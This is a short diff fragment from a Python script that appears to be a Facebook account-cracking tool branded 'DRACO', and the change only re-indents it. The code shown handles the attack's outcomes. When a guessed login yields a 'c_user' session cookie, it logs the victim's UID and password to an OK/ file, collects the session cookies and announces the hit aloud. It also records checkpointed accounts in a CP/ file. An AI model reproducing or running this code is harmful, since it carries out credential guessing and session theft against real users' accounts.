@@ -521,15 +521,15 @@ def _M4_(ids,pasc):
                             open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                             akun.append(idf+' • '+pw)
                             cp+=1
-                        break
+                            break
                         elif "c_user" in ses.cookies.get_dict().keys():
-                        ok+=1
-                        coki=po.cookies.get_dict()
-                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                        print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DRACO-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
-                        os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                        open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
-                        break
+                             ok+=1
+                             coki=po.cookies.get_dict()
+                             kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                             print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DRACO-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                             os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
+                             open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                             break
                 
             else:
                 continue
